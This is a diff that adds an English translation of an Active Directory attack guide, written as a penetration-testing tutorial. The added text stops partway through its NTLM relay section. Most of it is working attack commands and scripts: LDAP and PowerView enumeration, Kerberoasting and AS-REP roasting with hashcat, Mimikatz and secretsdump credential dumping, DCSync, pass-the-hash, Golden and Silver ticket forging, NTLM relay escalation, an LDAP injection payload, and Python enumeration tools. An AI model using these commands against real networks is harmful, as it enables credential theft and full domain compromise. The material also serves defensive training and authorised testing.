@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Active Directory 공격 완전 가이드
 
 ## AD 구조 이해
@@ -1063,4 +1069,1064 @@ Kerberos 설정:
   □ 비정상 Kerberos 티켓 요청 탐지
   □ DC에 대한 직접 LDAP 쿼리 모니터링
   □ Mimikatz/LSASS 접근 탐지 (EDR)
+```
+
+---
+
+<a name="english"></a>
+
+# Active Directory Attack — Complete Guide
+
+## Understanding AD Structure
+
+An Active Directory domain is organized in a Forest → Domain → OU hierarchy. The Domain Controller (DC) centrally provides LDAP (389), Kerberos (88), DNS (53), and SMB (445) services — these services are the primary attack targets.
+
+```
+Active Directory Domain Structure:
+  
+  Forest: company.local
+    └── Domain: corp.company.local
+          ├── Domain Controller (DC)
+          │     - LDAP (389/636)
+          │     - Kerberos (88)
+          │     - DNS (53)
+          │     - SMB (445)
+          │     - RPC (135)
+          │
+          ├── Organizational Unit (OU)
+          │     ├── Users
+          │     ├── Computers
+          │     └── Groups
+          │
+          └── Group Policy Objects (GPO)
+```
+
+---
+
+## 1. AD Reconnaissance (Enumeration)
+
+### Anonymous / Authenticated LDAP Enumeration
+
+LDAP (Lightweight Directory Access Protocol) is used to query AD for users, groups, and computers. If anonymous bind is permitted, domain information can be dumped without credentials. With an authenticated account, even more data can be gathered.
+
+```bash
+# Attempt anonymous LDAP query
+ldapsearch -x -h DC_IP -b "dc=company,dc=local"
+
+# Authenticated LDAP enumeration
+ldapsearch -x -h DC_IP \
+    -D "COMPANY\user" -w "Password123" \
+    -b "dc=company,dc=local" \
+    "(objectclass=user)" \
+    sAMAccountName userPrincipalName memberOf pwdLastSet
+
+# List all users
+ldapsearch -x -h DC_IP -D "COMPANY\user" -w "Password123" \
+    -b "dc=company,dc=local" "(objectClass=user)" sAMAccountName | \
+    grep sAMAccountName | awk '{print $2}'
+
+# Members of the Administrators group
+ldapsearch -x -h DC_IP -D "COMPANY\user" -w "Password123" \
+    -b "dc=company,dc=local" \
+    "(memberOf=CN=Domain Admins,CN=Users,dc=company,dc=local)" \
+    sAMAccountName
+```
+
+### PowerView (Internal Domain Reconnaissance)
+
+PowerView is a PowerShell-based AD reconnaissance module. Commands like `Get-DomainUser` and `Get-DomainGroup` enumerate domain objects in detail. It is executed directly from memory after bypassing AMSI (Anti-Malware Scan Interface) to minimize disk artifacts.
+
+```powershell
+# Load PowerView (after AMSI bypass)
+. .\PowerView.ps1
+
+# Basic information gathering
+Get-Domain                          # Current domain info
+Get-DomainController                # List DCs
+Get-DomainPolicy                    # Domain policies (password policy, etc.)
+(Get-DomainPolicy)."system access"  # Account lockout policy
+
+# User enumeration
+Get-DomainUser                                    # All users
+Get-DomainUser -SPN                              # Service accounts with SPNs (Kerberoast targets)
+Get-DomainUser -UACFilter PASSWD_NOTREQD         # Accounts with no password required
+Get-DomainUser -UACFilter NOT_PREAUTH            # AS-REP Roasting targets
+
+# Computer enumeration
+Get-DomainComputer                               # All computers in the domain
+Get-DomainComputer -OperatingSystem "*Server*"   # Servers only
+Get-DomainComputer -Ping                         # Check which are alive
+
+# Group enumeration
+Get-DomainGroup                                  # All groups
+Get-DomainGroupMember "Domain Admins"            # Admin members
+Get-DomainGroupMember "Enterprise Admins"        # Enterprise admins
+
+# Shared folders
+Find-DomainShare -CheckShareAccess              # Accessible shares
+Invoke-ShareFinder -CheckShareAccess
+
+# Local admins (important!)
+Find-LocalAdminAccess                           # Hosts where current user is local admin
+Invoke-EnumerateLocalAdmin                      # All local admin groups
+
+# GPO enumeration
+Get-DomainGPO                                   # All GPOs
+Get-DomainGPOLocalGroup                        # Local groups managed via GPO
+```
+
+### BloodHound — Attack Path Visualization
+
+BloodHound visualizes attack paths in an AD environment as a graph. It collects domain data using the SharpHound collector, stores it in a Neo4j database, and automatically analyzes the shortest privilege escalation paths.
+
+```bash
+# Collector: SharpHound (Windows)
+.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\
+
+# Or Python version (Linux)
+bloodhound-python -u user -p Password123 \
+    -d company.local -dc DC_IP \
+    -c All
+
+# Start BloodHound server
+sudo neo4j start
+bloodhound
+
+# Key queries (Cypher)
+# Shortest path to Domain Admin
+MATCH p=shortestPath(
+    (u:User {name:'USER@COMPANY.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@COMPANY.LOCAL'})
+) RETURN p
+
+# Accounts vulnerable to AS-REP Roasting
+MATCH (u:User {dontreqpreauth:true}) RETURN u
+
+# Accounts vulnerable to Kerberoasting
+MATCH (u:User) WHERE u.hasspn=true RETURN u
+
+# Accounts with DCSync rights
+MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u
+```
+
+---
+
+## 2. Kerberos Attacks
+
+### AS-REP Roasting
+
+Extracts hashes from AS-REP responses for accounts that have Kerberos pre-authentication disabled. After enumerating domain users, vulnerable accounts are targeted.
+
+```bash
+# Discover accounts with pre-auth disabled and extract hashes
+# Impacket
+python3 GetNPUsers.py company.local/ \
+    -usersfile users.txt \
+    -format hashcat \
+    -outputfile asrep_hashes.txt \
+    -dc-ip DC_IP
+
+# When domain credentials are available
+python3 GetNPUsers.py company.local/user:Password123 \
+    -request \
+    -format hashcat \
+    -outputfile asrep_hashes.txt
+
+# Rubeus (Windows)
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Cracking
+hashcat -m 18200 asrep_hashes.txt wordlist.txt
+```
+
+### Kerberoasting
+
+Kerberoasting requests Kerberos TGS tickets for service accounts with registered SPNs and cracks them offline. It can be performed with only regular domain user privileges. If a service account uses a weak password, the crack will succeed.
+
+```bash
+# Enumerate SPNs and request service tickets
+python3 GetUserSPNs.py company.local/user:Password123 \
+    -dc-ip DC_IP \
+    -request \
+    -outputfile kerberoast.txt
+
+# Target a specific user
+python3 GetUserSPNs.py company.local/user:Password123 \
+    -dc-ip DC_IP \
+    -request-user svc_sql
+
+# Rubeus
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
+.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt
+
+# Cracking
+# RC4 (0x17) → mode 13100
+hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule
+
+# AES256 (0x12) → mode 19700
+hashcat -m 19700 kerberoast_aes.txt wordlist.txt
+```
+
+---
+
+## 3. Credential Extraction
+
+### Mimikatz
+
+Mimikatz extracts passwords, NTLM hashes, and Kerberos tickets from Windows memory (the LSASS process). `sekurlsa::logonpasswords` dumps credentials for all currently logged-in users and requires administrator privileges.
+
+```batch
+rem Run Mimikatz (requires administrator privileges)
+mimikatz.exe
+
+rem Extract credentials from LSASS memory
+privilege::debug
+sekurlsa::logonpasswords
+
+rem Extract NTLM hashes
+sekurlsa::msv
+
+rem Dump Kerberos tickets
+sekurlsa::tickets
+sekurlsa::tickets /export
+
+rem SAM database (local accounts)
+lsadump::sam
+
+rem LSA Secrets
+lsadump::secrets
+
+rem Domain cached credentials (MSCACHE)
+lsadump::cache
+
+rem DCSync (requires Domain Admin privileges)
+lsadump::dcsync /domain:company.local /user:krbtgt
+lsadump::dcsync /domain:company.local /all /csv
+```
+
+### Secretsdump (Remote)
+
+impacket-secretsdump remotely dumps SAM and NTDS.dit hashes from Windows systems. It runs remotely via SMB or parses registry hives directly on the local machine.
+
+```bash
+# Remote SAM dump
+python3 secretsdump.py company.local/Administrator:Password123@TARGET_IP
+
+# With NTLM hash (Pass-the-Hash)
+python3 secretsdump.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP
+
+# DCSync (Domain Admin)
+python3 secretsdump.py -just-dc-ntlm company.local/Administrator:Password123@DC_IP
+
+# Using Volume Shadow Copy
+python3 secretsdump.py -use-vss company.local/Administrator:Password123@TARGET_IP
+```
+
+---
+
+## 4. Privilege Escalation Chain
+
+### Pass-the-Hash (PtH)
+
+Pass-the-Hash (PtH) uses the NTLM hash directly for authentication without recovering the actual password. Sessions are created using the hash via `impacket`'s `psexec.py`, `wmiexec.py`, or Mimikatz's `sekurlsa::pth`.
+
+```bash
+# Remote execution with NTLM hash
+python3 wmiexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP
+
+python3 psexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP
+
+python3 smbexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP
+
+# Evil-WinRM
+evil-winrm -i TARGET_IP \
+    -u Administrator \
+    -H NTLM_HASH
+```
+
+### Pass-the-Ticket (PtT)
+
+Pass-the-Ticket steals Kerberos tickets to access resources without a password. The .kirbi file extracted with Mimikatz is injected to bypass authentication.
+
+```bash
+# Use Kerberos ticket
+# Import ticket file (Mimikatz)
+# kerberos::ptt ticket.kirbi
+
+# Rubeus
+.\Rubeus.exe ptt /ticket:BASE64_TICKET
+
+# Impacket
+export KRB5CCNAME=/tmp/ticket.ccache
+python3 psexec.py -k -no-pass company.local/user@TARGET_IP
+```
+
+### Overpass-the-Hash (Pass-the-Key)
+
+Overpass-the-Hash converts an NTLM hash into a Kerberos TGT without recovering the password, using it to generate a Kerberos session.
+
+```bash
+# NTLM hash → obtain Kerberos TGT
+.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
+
+# Use AES key (better detection evasion)
+.\Rubeus.exe asktgt /user:Administrator /aes256:AES_KEY /opsec /ptt
+```
+
+---
+
+## 5. Domain Attacks
+
+### DCSync Attack
+
+The DCSync attack extracts hashes for all users by abusing domain controller replication rights. It requires Domain Admin privileges or an account with DS-Replication permissions.
+
+```bash
+# When DC replication rights are held (DS-Replication-Get-Changes-All)
+python3 secretsdump.py -just-dc \
+    company.local/user:Password123@DC_IP
+
+# Target specific accounts (krbtgt, Administrator)
+python3 secretsdump.py -just-dc-user krbtgt \
+    company.local/user:Password123@DC_IP
+
+# Requirement: Replicating Directory Changes All permission
+# (Grant this after discovering the path in BloodHound)
+```
+
+### Golden Ticket
+
+A Golden Ticket forges a Kerberos TGT with arbitrary user and group claims by stealing the NTLM hash of the krbtgt account. Its extremely long validity period makes it ideal for long-term domain persistence.
+
+```bash
+# After obtaining the krbtgt hash (via DCSync)
+# Mimikatz
+kerberos::golden \
+    /domain:company.local \
+    /sid:S-1-5-21-XXXX-XXXX-XXXX \
+    /krbtgt:KRBTGT_NTLM_HASH \
+    /user:Administrator \
+    /groups:512,513,518,519,520 \
+    /ticket:golden.kirbi
+
+# Use the ticket
+kerberos::ptt golden.kirbi
+
+# Impacket
+python3 ticketer.py \
+    -nthash KRBTGT_HASH \
+    -domain-sid S-1-5-21-XXXX \
+    -domain company.local \
+    Administrator
+
+export KRB5CCNAME=Administrator.ccache
+python3 psexec.py -k -no-pass company.local/Administrator@DC_IP
+```
+
+### Silver Ticket
+
+A Silver Ticket forges a TGS for a specific service using the service account hash. Unlike a Golden Ticket, it does not communicate with the Domain Controller, making detection more difficult.
+
+```bash
+# Forge a service ticket with the service account hash
+# Example: CIFS service (file share access)
+python3 ticketer.py \
+    -nthash SERVICE_ACCOUNT_HASH \
+    -domain-sid S-1-5-21-XXXX \
+    -domain company.local \
+    -spn cifs/server.company.local \
+    Administrator
+
+export KRB5CCNAME=Administrator.ccache
+python3 smbclient.py -k -no-pass company.local/Administrator@server.company.local
+```
+
+---
+
+## 6. Trust Relationship Attacks
+
+Enumerate and attack trust relationships between AD forests. With a bidirectional trust, compromising one domain can propagate to the connected domain.
+
+```bash
+# Enumerate inter-forest trusts
+Get-DomainTrust
+Get-ForestTrust
+nltest /domain_trusts
+
+# Access another domain with a trust ticket
+# Issue an inter-forest TGT
+.\Rubeus.exe asktgt /user:Administrator \
+    /domain:source.local \
+    /rc4:HASH \
+    /ptt
+
+# SID History attack via trust relationship
+# (Include Enterprise Admin SID in SIDHistory)
+```
+
+---
+
+## 7. LDAP Attacks
+
+### LDAP Injection
+
+Vulnerable authentication code and attack methods for LDAP injection. Using user input directly in LDAP queries can lead to authentication bypass or information disclosure.
+
+```python
+# Vulnerable authentication code
+def authenticate(username, password):
+    ldap_filter = f"(&(uid={username})(password={password}))"
+    # → Injection possible
+
+# Attack payload
+username = "admin)(&"  # Filter manipulation
+# → (&(uid=admin)(&)(password=...)) = always true
+
+username = "*"  # Returns all users
+password = "*"
+```
+
+### LDAP Relay (NTLM Relay to LDAP)
+
+Relays NTLM authentication to LDAP. In environments where SMB signing is disabled, this can be used to add domain computers or modify ACLs.
+
+```bash
+# LDAP relay with ntlmrelayx
+python3 ntlmrelayx.py \
+    -t ldap://DC_IP \
+    -smb2support \
+    --escalate-user regular_user  # Elevate a regular user to Domain Admin
+
+# Or create a new computer account (possible with default privileges)
+python3 ntlmrelayx.py \
+    -t ldaps://DC_IP \
+    --add-computer
+```
+
+---
+
+## 8. Leveraging BloodHound Attack Paths
+
+BloodHound visualizes attack paths in an AD environment as a graph. It collects domain data using SharpHound, stores it in a Neo4j database, and automatically identifies the shortest privilege escalation paths.
+
+```
+Common Attack Chain Examples:
+
+Path 1: Regular User → Domain Admin
+  Regular user
+    └─[Kerberoasting]→ Service account password
+         └─[Local Admin]→ Workstation A
+              └─[Token Impersonation]→ Logged-in IT staff
+                   └─[Local Admin on DC]→ Domain Admin
+
+Path 2: Phishing → Domain Admin
+  User PC
+    └─[Mimikatz]→ Cached credentials
+         └─[Pass-the-Hash]→ Another workstation
+              └─[Local Admin]→ Session with admin logged in
+                   └─[Token]→ Domain Admin
+
+Path 3: AS-REP Roasting
+  Account without pre-auth
+    └─[AS-REP Hash]→ Cracking
+         └─[GenericAll on Group]→ Add self to DA group
+```
+
+Mark compromised accounts and computers in BloodHound to visualize attack paths. Automatically identify the shortest privilege escalation path within the domain.
+
+```bash
+# BloodHound auto-marking — mark compromised accounts/computers
+curl -s -X POST http://localhost:7474/db/data/cypher \
+    -H "Content-Type: application/json" \
+    -u neo4j:bloodhound \
+    -d '{"query": "MATCH (u:User {name:\"COMPROMISED@DOMAIN\"}) SET u.owned=true RETURN u.name"}'
+
+# Top 5 most dangerous paths (Cypher)
+# Shortest path node count to DA
+MATCH p=shortestPath((u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@COMPANY.LOCAL"}))
+RETURN u.name, length(p) ORDER BY length(p) LIMIT 5
+```
+
+### BloodHound Data Collection Automation (Python)
+
+BloodHound visualizes attack paths in an AD environment as a graph. The SharpHound collector gathers domain data, stores it in Neo4j, and automatically analyzes the shortest privilege escalation paths.
+
+```python
+#!/usr/bin/env python3
+"""
+BloodHound collection automation — bloodhound-python wrapper
+Attempts multiple collection methods sequentially and merges results
+Usage: python3 bh_collect.py -d company.local -u user -p Password123 --dc 10.0.0.1
+"""
+import argparse
+import json
+import shutil
+import subprocess
+import sys
+import tempfile
+import zipfile
+from datetime import datetime
+from pathlib import Path
+
+
+COLLECTION_METHODS = ["Default", "DCOnly", "LocalAdmin", "Session", "Trusts", "ACL"]
+
+
+def check_prerequisites() -> bool:
+    """Check that bloodhound-python is installed."""
+    if shutil.which("bloodhound-python"):
+        return True
+    print("[!] bloodhound-python is required: pip3 install bloodhound")
+    return False
+
+
+def run_collection(
+    domain: str, dc_ip: str, username: str,
+    password: str = "", ntlm_hash: str = "",
+    method: str = "All", output_dir: Path = Path("."),
+    dns_tcp: bool = False,
+) -> bool:
+    """Run bloodhound-python."""
+    cmd = [
+        "bloodhound-python",
+        "-d", domain,
+        "-u", username,
+        "--dc", dc_ip,
+        "-c", method,
+        "--zip",
+        "-o", str(output_dir),
+        "--dns-timeout", "5",
+        "--dns-tcp" if dns_tcp else "",
+    ]
+
+    if password:
+        cmd += ["-p", password]
+    elif ntlm_hash:
+        cmd += ["-hashes", ntlm_hash]
+
+    cmd = [c for c in cmd if c]  # Remove empty strings
+
+    print(f"[*] Collection method: {method}")
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True, text=True, timeout=300,
+        )
+        if result.returncode == 0:
+            print(f"[+] Collection complete: {method}")
+            return True
+        else:
+            print(f"[!] Collection failed: {result.stderr[:200]}")
+            return False
+    except subprocess.TimeoutExpired:
+        print("[!] Collection timed out (300s)")
+        return False
+    except FileNotFoundError:
+        print("[!] bloodhound-python executable not found")
+        return False
+
+
+def merge_zip_files(output_dir: Path, final_name: str) -> Path:
+    """Merge collected JSON files into a single ZIP."""
+    json_files = list(output_dir.glob("*.json"))
+    final_zip = output_dir / final_name
+
+    with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+        for jf in json_files:
+            zf.write(jf, jf.name)
+
+    print(f"[+] Merged ZIP: {final_zip}  ({len(json_files)} files)")
+    return final_zip
+
+
+def print_summary(output_dir: Path) -> None:
+    """Print a count summary from collected JSON files."""
+    summary: dict[str, int] = {}
+    for jf in output_dir.glob("*.json"):
+        try:
+            data = json.loads(jf.read_text())
+            key = jf.stem.split("_")[0].capitalize()
+            count = data.get("meta", {}).get("count", len(data.get("data", [])))
+            summary[key] = summary.get(key, 0) + count
+        except Exception:
+            continue
+
+    print("\n[*] Collection summary:")
+    for obj_type, count in sorted(summary.items()):
+        print(f"    {obj_type:<15}  {count:>6}")
+
+
+def main() -> None:
+    if not check_prerequisites():
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(description="BloodHound data collection automation")
+    parser.add_argument("-d", "--domain", required=True, help="Target domain")
+    parser.add_argument("-u", "--username", required=True, help="Username")
+    parser.add_argument("-p", "--password", default="", help="Password")
+    parser.add_argument("-H", "--hash", default="", dest="ntlm_hash", help="NTLM hash")
+    parser.add_argument("--dc", required=True, dest="dc_ip", help="DC IP")
+    parser.add_argument("-o", "--output", default="bloodhound_data", help="Output directory")
+    parser.add_argument("-c", "--collection", default="All",
+                        choices=COLLECTION_METHODS + ["All"], help="Collection method")
+    parser.add_argument("--dns-tcp", action="store_true", help="Use DNS over TCP")
+    args = parser.parse_args()
+
+    output_dir = Path(args.output)
+    output_dir.mkdir(parents=True, exist_ok=True)
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    success = run_collection(
+        domain=args.domain,
+        dc_ip=args.dc_ip,
+        username=args.username,
+        password=args.password,
+        ntlm_hash=args.ntlm_hash,
+        method=args.collection,
+        output_dir=output_dir,
+        dns_tcp=args.dns_tcp,
+    )
+
+    if success:
+        print_summary(output_dir)
+        zip_file = merge_zip_files(output_dir, f"bloodhound_{ts}.zip")
+        print(f"\n[+] Import '{zip_file}' into BloodHound")
+        print("    Start neo4j: sudo neo4j start")
+        print("    Launch BloodHound → Upload Data → select zip file")
+    else:
+        print("[!] Collection failed")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 9. AD Attacks from Linux (Using Impacket)
+
+### Installing and Configuring Impacket
+
+Install the Impacket toolkit. This Python-based library implements Windows protocols such as SMB, MSRPC, and NTLM and is essential for AD attacks.
+
+```bash
+# Install Impacket
+pip3 install impacket
+
+# Or on Kali
+apt-get install python3-impacket impacket-scripts
+
+# Kerberos configuration (if needed)
+# /etc/krb5.conf
+[libdefaults]
+    default_realm = COMPANY.LOCAL
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    COMPANY.LOCAL = {
+        kdc = dc01.company.local
+        admin_server = dc01.company.local
+    }
+
+[domain_realm]
+    .company.local = COMPANY.LOCAL
+    company.local = COMPANY.LOCAL
+```
+
+### AD Enumeration Automation Tool (Python — Impacket-based)
+
+```python
+#!/usr/bin/env python3
+"""
+Active Directory automated enumeration tool — Impacket-based
+- Collects users, groups, computers, SPNs, and AS-REP targets in bulk
+- Saves results as JSON and text reports
+Usage:
+  python3 ad_enum.py -d company.local -u user -p Password123 --dc 192.168.1.10
+  python3 ad_enum.py -d company.local -u user -H <NTLM_HASH> --dc 192.168.1.10
+"""
+import argparse
+import json
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from pathlib import Path
+
+try:
+    from impacket.dcerpc.v5 import transport, samr
+    from impacket.ldap import ldap, ldaptypes
+    from impacket.ldap.ldapasn1 import SearchResultEntry
+    from impacket.smbconnection import SMBConnection
+except ImportError:
+    sys.exit("[!] impacket is required: pip3 install impacket")
+
+
+class ADEnumerator:
+    """AD object enumeration via Impacket LDAP."""
+
+    BASE_ATTRS_USER = [
+        "sAMAccountName", "userPrincipalName", "displayName",
+        "memberOf", "userAccountControl", "pwdLastSet",
+        "lastLogon", "servicePrincipalName", "description",
+    ]
+    BASE_ATTRS_COMP = [
+        "sAMAccountName", "dNSHostName", "operatingSystem",
+        "operatingSystemVersion", "lastLogon",
+    ]
+    BASE_ATTRS_GROUP = [
+        "sAMAccountName", "description", "member", "memberOf",
+    ]
+
+    UAC_FLAGS = {
+        0x0002: "DISABLED",
+        0x0010: "LOCKOUT",
+        0x0020: "PASSWD_NOTREQD",
+        0x0040: "PASSWD_CANT_CHANGE",
+        0x0200: "NORMAL_ACCOUNT",
+        0x10000: "DONT_EXPIRE_PASSWORD",
+        0x400000: "NOT_DELEGATED",
+        0x1000000: "PREAUTH_NOT_REQUIRED",  # AS-REP Roasting target
+    }
+
+    def __init__(self, domain: str, dc_ip: str, username: str,
+                 password: str = "", ntlm_hash: str = "") -> None:
+        self.domain = domain
+        self.dc_ip = dc_ip
+        self.username = username
+        self.password = password
+        self.ntlm_hash = ntlm_hash
+        self.base_dn = "dc=" + ",dc=".join(domain.split("."))
+        self._conn: ldap.LDAPConnection | None = None
+        self.results: dict = {
+            "domain": domain, "dc_ip": dc_ip,
+            "users": [], "groups": [], "computers": [],
+            "kerberoastable": [], "asrep_roastable": [],
+            "enumerated_at": datetime.now().isoformat(),
+        }
+
+    def connect(self) -> None:
+        """Establish LDAP connection."""
+        ldap_url = f"ldap://{self.dc_ip}"
+        try:
+            self._conn = ldap.LDAPConnection(ldap_url, self.base_dn)
+            lm_hash, nt_hash = ("", "")
+            if self.ntlm_hash:
+                if ":" in self.ntlm_hash:
+                    lm_hash, nt_hash = self.ntlm_hash.split(":", 1)
+                else:
+                    lm_hash, nt_hash = ("aad3b435b51404eeaad3b435b51404ee", self.ntlm_hash)
+            self._conn.login(
+                self.username, self.password,
+                self.domain, lm_hash, nt_hash
+            )
+            print(f"[+] LDAP connection successful: {self.dc_ip}")
+        except Exception as e:
+            sys.exit(f"[!] LDAP connection failed: {e}")
+
+    def _search(self, ldap_filter: str, attributes: list[str]) -> list[dict]:
+        """Execute LDAP search and return list of result dictionaries."""
+        results: list[dict] = []
+        try:
+            sc = ldap.SimplePagedResultsControl(size=1000)
+            resp = self._conn.search(
+                searchFilter=ldap_filter,
+                attributes=attributes,
+                sizeLimit=0,
+                searchControls=[sc],
+            )
+            for item in resp:
+                if not isinstance(item, SearchResultEntry):
+                    continue
+                entry: dict = {}
+                for attr in item["attributes"]:
+                    name = str(attr["type"])
+                    vals = [str(v) for v in attr["vals"]]
+                    entry[name] = vals[0] if len(vals) == 1 else vals
+                results.append(entry)
+        except Exception as e:
+            print(f"[!] Search error ({ldap_filter[:40]}): {e}")
+        return results
+
+    def _decode_uac(self, uac_val: str) -> list[str]:
+        try:
+            uac = int(uac_val)
+        except (ValueError, TypeError):
+            return []
+        return [name for flag, name in self.UAC_FLAGS.items() if uac & flag]
+
+    def enum_users(self) -> None:
+        """Enumerate user accounts — identify Kerberoastable and AS-REP targets."""
+        print("[*] Enumerating users...")
+        users = self._search(
+            "(objectClass=user)", self.BASE_ATTRS_USER
+        )
+        for user in users:
+            uac_flags = self._decode_uac(user.get("userAccountControl", "0"))
+            user["uac_flags"] = uac_flags
+            self.results["users"].append(user)
+
+            sam = user.get("sAMAccountName", "")
+            # Kerberoastable: accounts with SPNs
+            spn = user.get("servicePrincipalName")
+            if spn:
+                self.results["kerberoastable"].append({
+                    "account": sam, "spn": spn,
+                })
+                print(f"  [Kerberoast] {sam}  SPN: {spn}")
+
+            # AS-REP Roastable: pre-authentication not required
+            if "PREAUTH_NOT_REQUIRED" in uac_flags:
+                self.results["asrep_roastable"].append({"account": sam})
+                print(f"  [AS-REP]     {sam}  (pre-auth not required)")
+
+        print(f"[+] Users: {len(users)}  "
+              f"Kerberoastable: {len(self.results['kerberoastable'])}  "
+              f"AS-REP: {len(self.results['asrep_roastable'])}")
+
+    def enum_groups(self) -> None:
+        """Enumerate groups — highlight Domain Admins and Enterprise Admins members."""
+        print("[*] Enumerating groups...")
+        groups = self._search("(objectClass=group)", self.BASE_ATTRS_GROUP)
+        self.results["groups"] = groups
+
+        high_value = ["Domain Admins", "Enterprise Admins", "Schema Admins",
+                      "Administrators", "Account Operators"]
+        for grp in groups:
+            if grp.get("sAMAccountName") in high_value:
+                members = grp.get("member", [])
+                if isinstance(members, str):
+                    members = [members]
+                if members:
+                    print(f"  [!] {grp['sAMAccountName']}: {len(members)} members")
+                    for m in members[:5]:
+                        print(f"      {m.split(',')[0].replace('CN=', '')}")
+        print(f"[+] Groups: {len(groups)}")
+
+    def enum_computers(self) -> None:
+        """Enumerate computer accounts."""
+        print("[*] Enumerating computers...")
+        computers = self._search("(objectClass=computer)", self.BASE_ATTRS_COMP)
+        self.results["computers"] = computers
+        print(f"[+] Computers: {len(computers)}")
+
+        # Detect legacy operating systems
+        legacy = [c for c in computers
+                  if any(k in c.get("operatingSystem", "") for k in ["2003", "XP", "Vista", "2008"])]
+        if legacy:
+            print(f"  [!] Found {len(legacy)} legacy OS machines:")
+            for c in legacy[:5]:
+                print(f"      {c.get('dNSHostName', c.get('sAMAccountName'))}  "
+                      f"→  {c.get('operatingSystem', '?')}")
+
+    def save_report(self, output_dir: Path) -> None:
+        """Save JSON and text reports."""
+        output_dir.mkdir(parents=True, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        json_path = output_dir / f"ad_enum_{ts}.json"
+        json_path.write_text(json.dumps(self.results, indent=2, ensure_ascii=False))
+        print(f"\n[+] JSON saved: {json_path}")
+
+        txt_path = output_dir / f"ad_enum_{ts}.txt"
+        lines = [
+            f"AD Enumeration Report  {self.results['enumerated_at']}",
+            f"Domain: {self.domain}  DC: {self.dc_ip}",
+            "=" * 55,
+            f"Users:    {len(self.results['users'])}",
+            f"Groups:   {len(self.results['groups'])}",
+            f"Computers:{len(self.results['computers'])}",
+            f"Kerberoastable: {len(self.results['kerberoastable'])} accounts",
+            f"AS-REP Roastable: {len(self.results['asrep_roastable'])} accounts",
+            "",
+            "[ Kerberoastable Accounts ]",
+        ] + [f"  {k['account']}  {k['spn']}" for k in self.results["kerberoastable"]] + [
+            "",
+            "[ AS-REP Roastable Accounts ]",
+        ] + [f"  {k['account']}" for k in self.results["asrep_roastable"]]
+
+        txt_path.write_text("\n".join(lines))
+        print(f"[+] Text report saved: {txt_path}")
+
+    def run_all(self) -> None:
+        """Run full enumeration."""
+        self.connect()
+        self.enum_users()
+        self.enum_groups()
+        self.enum_computers()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="AD automated enumeration tool (Impacket LDAP)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""Examples:
+  python3 ad_enum.py -d company.local -u alice -p Password123 --dc 192.168.1.10
+  python3 ad_enum.py -d company.local -u alice -H aad3b435...:31d6cfe... --dc 10.0.0.1
+        """,
+    )
+    parser.add_argument("-d", "--domain", required=True, help="Target domain (e.g. company.local)")
+    parser.add_argument("-u", "--username", required=True, help="Authentication username")
+    parser.add_argument("-p", "--password", default="", help="Password")
+    parser.add_argument("-H", "--hash", default="", dest="ntlm_hash",
+                        help="NTLM hash (LM:NT or NT only)")
+    parser.add_argument("--dc", required=True, dest="dc_ip", help="DC IP address")
+    parser.add_argument("-o", "--output", default="ad_results", help="Output directory")
+    args = parser.parse_args()
+
+    if not args.password and not args.ntlm_hash:
+        sys.exit("[!] Either -p <password> or -H <hash> is required")
+
+    enumerator = ADEnumerator(
+        domain=args.domain,
+        dc_ip=args.dc_ip,
+        username=args.username,
+        password=args.password,
+        ntlm_hash=args.ntlm_hash,
+    )
+    enumerator.run_all()
+    enumerator.save_report(Path(args.output))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Remote Execution Tools (Impacket)
+
+Use impacket's psexec.py to execute commands remotely over SMB. Authentication is done with credentials or an NTLM hash to run commands on remote systems.
+
+```bash
+# psexec.py — SMB-based remote command execution
+python3 psexec.py company.local/Administrator:Password123@TARGET_IP
+
+# wmiexec.py — WMI-based (no file drop)
+python3 wmiexec.py company.local/Administrator:Password123@TARGET_IP
+
+# smbexec.py — SMB service-based
+python3 smbexec.py company.local/Administrator:Password123@TARGET_IP
+
+# atexec.py — Task Scheduler-based
+python3 atexec.py company.local/Administrator:Password123@TARGET_IP whoami
+
+# dcomexec.py — DCOM-based
+python3 dcomexec.py company.local/Administrator:Password123@TARGET_IP whoami
+
+# Execute with hash (Pass-the-Hash)
+python3 wmiexec.py -hashes :NTLM_HASH_HERE company.local/Administrator@TARGET_IP
+```
+
+### SMB-Related Tools
+
+Use impacket's smbclient.py to upload/download files to SMB shares. Authenticate with credentials or a hash to access the shared filesystem.
+
+```bash
+# smbclient.py — SMB file access
+python3 smbclient.py company.local/user:Password123@TARGET_IP
+
+# List shares
+python3 smbclient.py -L TARGET_IP -U 'company.local/user%Password123'
+
+# Download a file
+python3 smbclient.py //TARGET_IP/C$ -U 'company.local/Administrator%Password123' -c 'get Users\Administrator\Desktop\flag.txt'
+
+# GetSPN.py — SPN enumeration
+python3 GetUserSPNs.py company.local/user:Password123 -dc-ip DC_IP
+```
+
+### NTLM Relay Attack
+```bash
+# Requirement: SMB signing disabled (most workstations)
+# Check SMB signing
+nmap --script smb2-security-mode -p 445 TARGET_SUBNET/24
+
+# Identify relay-capable hosts
